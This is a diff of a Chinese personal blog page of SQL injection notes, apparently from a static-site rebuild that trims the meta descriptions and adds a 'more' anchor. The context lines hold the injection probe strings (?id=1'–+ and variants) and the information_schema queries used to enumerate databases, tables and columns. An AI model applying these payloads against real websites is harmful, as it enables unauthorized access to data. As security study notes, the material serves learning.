@@ -79,14 +79,14 @@
 
 
 
-<meta name="description" content="有关SQL注入查看开发者使用哪种查询 ?id=1’–+ ?id=1–+ ?id=1’)–+ ?id=1”)–+ ?id=1”))-++  爆库,表,字段猜数据库1select schema_name from information_schema.schemata 猜某库的数据表1select table_name from information_schema.tables where tabl">
+<meta name="description" content="有关SQL注入查看开发者使用哪种查询 ?id=1’–+ ?id=1–+ ?id=1’)–+ ?id=1”)–+ ?id=1”))-++">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL Inject">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;sqlInjec_note&#x2F;index.html">
 <meta property="og:site_name" content="Ivoripuion&#39;s blog">
-<meta property="og:description" content="有关SQL注入查看开发者使用哪种查询 ?id=1’–+ ?id=1–+ ?id=1’)–+ ?id=1”)–+ ?id=1”))-++  爆库,表,字段猜数据库1select schema_name from information_schema.schemata 猜某库的数据表1select table_name from information_schema.tables where tabl">
+<meta property="og:description" content="有关SQL注入查看开发者使用哪种查询 ?id=1’–+ ?id=1–+ ?id=1’)–+ ?id=1”)–+ ?id=1”))-++">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-04-16T12:17:45.029Z">
+<meta property="og:updated_time" content="2020-06-08T02:57:35.502Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -356,6 +356,8 @@
 <li>?id=1”)–+</li>
 <li>?id=1”))-++</li>
 </ol>
+<a id="more"></a>
+
 <h2 id="爆库-表-字段"><a href="#爆库-表-字段" class="headerlink" title="爆库,表,字段"></a>爆库,表,字段</h2><h3 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
 <h3 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=’xxxxx’</span><br></pre></td></tr></table></figure>
 <h3 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=’xxxxx’</span><br></pre></td></tr></table></figure>
